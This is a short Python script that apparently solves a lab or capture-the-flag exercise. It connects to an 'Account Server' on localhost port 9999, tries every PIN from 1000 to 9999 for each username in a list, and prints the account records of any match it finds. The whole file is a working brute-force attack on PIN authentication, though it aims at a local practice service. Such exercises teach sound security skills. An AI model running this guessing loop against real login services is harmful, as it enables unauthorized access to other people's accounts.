#! /usr/bin/python

# Run the Account Server service, which should run on port 9999.  You can interact with it on the command line
# using 'nc localhost 9999'.  There is a known test account called 'test' with pin '1234'.
# This service is known to be used by famous superheros.  They will usually use their secret identity's last
# name (in lowercase) as a login.
#
# Hints:
#  - For loops can cover a range, eg:   for x in range(0,10): will loop from 0 to 9
#  - You may have to play with doing an extra recv() to get a prompt
#  - Test your logic with a couple of loops using the test account to make sure it works.

import socket

with open('users.txt') as f:
    users = f.read().splitlines()
s = socket.create_connection(('localhost', 9999))
print (s.recv(1024))   # Retrieve the prompt
for user in users:
    print ('Trying all pin combinations for %s...' % user)
    for p in range(1000, 10000):
        #print 'list %s %i' % (user, p)
        s.send('list %s %i' % (user, p))
        response = s.recv(1024)
        if response.strip().startswith('type'):  # found a header
            print ('Found match for user %s.  Pin = %i' % (user, p))
            print (s.recv(1024))   # print the accounts
            break
        else:
            s.recv(1024) # get next prompt
s.close()